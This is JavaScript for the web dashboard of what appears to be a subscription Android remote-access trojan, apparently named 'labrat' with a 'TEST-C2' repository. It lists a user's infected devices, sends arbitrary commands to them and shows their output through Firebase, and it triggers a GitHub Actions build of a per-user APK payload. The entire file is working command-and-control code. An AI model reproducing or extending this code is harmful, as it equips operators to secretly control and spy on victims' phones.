let currentDevice = null, outputListener = null, isPremium = false, currentUID = null;
firebase.auth().onAuthStateChanged(user => {
    if (!user) { window.location.href = 'login.html'; return; }
    currentUID = user.uid; document.getElementById('user-email').textContent = user.email; document.getElementById('avatar-init').textContent = user.email.charAt(0).toUpperCase();
    db.ref('labrat/users/' + user.uid).on('value', snap => {
        const data = snap.val() || {};
        if(data.banned) { document.getElementById('banned-screen').classList.remove('hidden'); document.getElementById('dashboard-content').classList.add('hidden'); return; }
        const role = data.role || 'Basic'; const exp = data.expired_at;
        document.getElementById('user-role').textContent = role;
        if (role === 'Developer') { document.getElementById('dev-link').classList.remove('hidden'); document.getElementById('dev-link').href = 'dev.html'; isPremium = true; }
        else if (exp && exp > Date.now()) { isPremium = true; document.getElementById('user-expired').textContent = role === 'Pro Trial' ? 'Trial Aktif' : 'Premium Aktif'; document.getElementById('user-expired').style.color = '#3fb950'; }
        else { isPremium = false; document.getElementById('user-expired').textContent = 'Expired'; document.getElementById('btn-build').classList.add('locked'); document.getElementById('btn-build').onclick = () => alert('Upgrade dulu!'); }
        db.ref('labrat/devices/' + user.uid).on('value', devSnap => {
            const devices = devSnap.val() || {}; const entries = Object.entries(devices);
            document.getElementById('total-count').textContent = entries.length; document.getElementById('online-count').textContent = entries.filter(([, d]) => d.online).length;
            const list = document.getElementById('device-list'); list.innerHTML = '';
            entries.forEach(([id, dev]) => { const c = document.createElement('div'); c.className = 'device-card'; c.innerHTML = `<div style="display:flex; justify-content:space-between;"><strong style="color:#58a6ff;">${id}</strong><span style="color:${dev.online?'#3fb950':'#f85149'};">● ${dev.online?'Online':'Offline'}</span></div><div>${dev.model}</div>`; c.onclick = () => { if(isPremium) openConsole(id); else alert('Upgrade dulu!'); }; list.appendChild(c); });
        });
    });
});
function openConsole(id) { currentDevice = id; document.getElementById('console-title').textContent = 'Console — ' + id; document.getElementById('console-panel').classList.remove('hidden'); if(outputListener) outputListener.off(); outputListener = db.ref(`labrat/output/${currentUID}/${id}`).limitToLast(1); outputListener.on('child_added', s => { document.getElementById('output-box').textContent = JSON.stringify(s.val(), null, 2); }); }
function sendCommand() { if(!currentDevice) return; db.ref(`labrat/commands/${currentUID}/${currentDevice}/${Date.now().toString(36)}`).set({action:document.getElementById('cmd-action').value, args:document.getElementById('cmd-args').value}); }
async function buildAPK(event) { if(!isPremium) return; const btn = event.target; const user = firebase.auth().currentUser; let pat = localStorage.getItem('gh_pat'); if (!pat) { pat = prompt("PAT GitHub:"); if (!pat) return; localStorage.setItem('gh_pat', pat.trim()); } btn.textContent = "⏳..."; btn.disabled = true; await fetch('https://api.github.com/repos/wulandarisay6-hash/TEST-C2/actions/workflows/build.yml/dispatches', { method: 'POST', headers: { 'Authorization': 'token ' + pat.trim(), 'Content-Type': 'application/json' }, body: JSON.stringify({ ref: 'main', inputs: { uid: user.uid } }) }).then(res => { if(res.status === 204) window.open('https://github.com/wulandarisay6-hash/TEST-C2/releases', '_blank'); else alert('Gagal Build'); }); btn.textContent = "⚡ Build APK"; btn.disabled = false; }
